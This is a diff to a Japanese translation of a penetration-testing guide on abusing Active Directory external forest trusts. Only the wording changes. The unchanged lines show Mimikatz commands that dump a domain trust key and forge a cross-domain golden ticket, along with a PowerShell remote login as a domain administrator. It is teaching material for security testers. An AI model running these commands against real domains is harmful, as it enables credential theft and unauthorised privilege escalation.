@@ -74,7 +74,7 @@ Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 
 ### ログイン
 
-外部ドメインにアクセス権を持つユーザーの資格情報を使用して、通常の方法でアクセスできるはずです:
+外部ドメインにアクセス権を持つユーザーの資格情報を使用して、通常の方法でログインすることで、次の内容にアクセスできるはずです:
 ```bash
 Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
 ```
@@ -85,13 +85,13 @@ Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\admini
 ユーザーが**あるフォレストから別のフォレストに移行され**、**SIDフィルタリングが有効でない**場合、**他のフォレストからSIDを追加する**ことが可能になり、この**SID**は**トラストを通じて認証する際にユーザーのトークンに追加されます**。
 
 > [!WARNING]
-> リマインダーとして、署名キーを取得するには
+> 注意として、署名キーを取得するには
 >
 > ```bash
 > Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
 > ```
 
-**信頼された**キーで**現在のドメインのユーザーを模倣する**TGTに**署名する**ことができます。
+**信頼された**キーで**現在のドメインのユーザーを偽装するTGTに署名する**ことができます。
 ```bash
 # Get a TGT for the cross-domain privileged user to the other domain
 Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'
